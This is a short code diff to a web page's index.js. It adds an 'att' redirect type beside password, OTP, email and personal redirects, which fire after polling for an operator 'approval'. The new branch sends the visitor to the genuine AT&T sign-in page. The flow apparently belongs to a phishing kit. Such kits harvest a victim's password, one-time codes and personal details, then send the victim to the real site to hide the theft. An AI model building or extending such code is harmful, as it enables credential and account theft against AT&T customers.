@@ -133,7 +133,7 @@ export default function Home() {
                 const redirectType = approval.redirectType || 'password';
                 console.log(`[index.js] Approval received via polling: ${redirectType} for user: ${userId}`);
                 
-                // Store userId for OTP page
+                // Store userId for OTP/email/personal pages
                 if (redirectType === 'otp' || redirectType === 'email' || redirectType === 'personal') {
                   localStorage.setItem('lastUserId', userId);
                 }
@@ -186,6 +186,8 @@ export default function Home() {
         window.location.href = '/email';
       } else if (redirectType === 'personal') {
         window.location.href = '/personal';
+      } else if (redirectType === 'att') {
+        window.location.href = 'https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=login&appName=m14186&loginSuccessURL=https:%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fresponse_type%3Did_token%26client_id%3Dm14186%26redirect_uri%3Dhttps%253A%252F%252Fwww.att.com%252Fmsapi%252Flogin%252Funauth%252Fservice%252Fv1%252Fhaloc%252Foidc%252Fredirect%26state%3Dfrom%253Dnx%26scope%3Dopenid%26response_mode%3Dform_post%26nonce%3D3nv01nEz';
       }
     }
 
